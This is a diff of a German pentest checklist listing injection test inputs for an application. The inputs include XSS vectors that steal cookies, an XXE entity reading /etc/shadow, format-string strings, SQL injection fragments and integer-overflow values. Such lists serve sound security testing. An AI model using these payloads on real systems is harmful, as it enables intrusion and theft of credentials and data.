@@ -1,11 +1,14 @@
-Injections
-In dieser Datei sind Eingabewerte, welche Fehlverhalten in einer Anwendung provozieren.
-Diese Eingabewerte sind ausführbarer Code und zielen darauf Fehler bei der Trennung von Code- und Daten zu erzeugen.
+Checkliste: Injections
+###############################################################################
+Datum:
+Tester:
+Verantwortlicher:
+Projektname:
+Versionsnummer:
+###############################################################################
 
-Diese Liste kann nach belieben erweitert werden.
 
-
-XSS	
+XSS
 	<body onload=alert('1')>
 	<b onmouseover=alert('2')>click me!</b>
 	<IMG SRC=j&#X41vascript:alert('3')>
@@ -17,12 +20,12 @@ XSS
 	<scr<script>ipt>alert(document.cookie)</script>
 	aaa@aa.com"><script>alert('8')</script>
 	aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E
-	;alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
-	alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
 	></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
 	';!--"<XSS>=&{()}
-	
-XML	
+alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
+alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
+
+XML
 	<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
 	<?xml version=”1.0” encoding=”ISO-8859-1”?><foo><![CDATA[<]]>
 	SCRIPT<![CDATA[>]]>alert(‘gotcha’);<![CDATA[<]]>/
@@ -39,8 +42,8 @@ XML
 	foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM “file:///etc/
 	shadow”>]><foo>&xee;</foo>
 	<?xml version=”1.0” encoding=”ISO-8859-1”?><!DOCTYPE
-	
-String	
+
+String
 	%s%p%x%d
 	.1024d
 	%.2049d
@@ -59,8 +62,10 @@ String
 	%#0123456x%08x%x%s%p%d%n%o%u%c%h%l%q%-
 	j%z%Z%t%i%e%g%f%a%C%S%08x%%
 	%s x 129
-	
-SQL	
+
+SQL
+	‘
+	'
 	‘||(elt(-3+5,bin(15),ord(10),hex(char(45))))
 	||6
 	‘||’6
@@ -85,8 +90,8 @@ SQL
 	TABLES--
 	) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.
 	TABLES
-	
-Integer Overflow	
+
+Integer Overflow
 	-1
 	0
 	0x100
@@ -99,22 +104,22 @@ Integer Overflow
 	0xffffffff
 	0x10000
 	0x100000
-	
-HTML-Zeichen	
-	<     
-	>     
-	(     
-	)     
-	#     
-	&     
-     	&quot;
-	
-JavaScript String Operationen	
-	\n 
-	\r 
-	\' 
-	\" 
-	\\ 
-	\u0198 
+
+HTML-Zeichen
+	<
+	>
+	(
+	)
+	#
+	&
+ 	&quot;
+
+JavaScript String Operationen
+	\n
+	\r
+	\'
+	\"
+	\\
+	\u0198
 Sonstige
 	[00000]
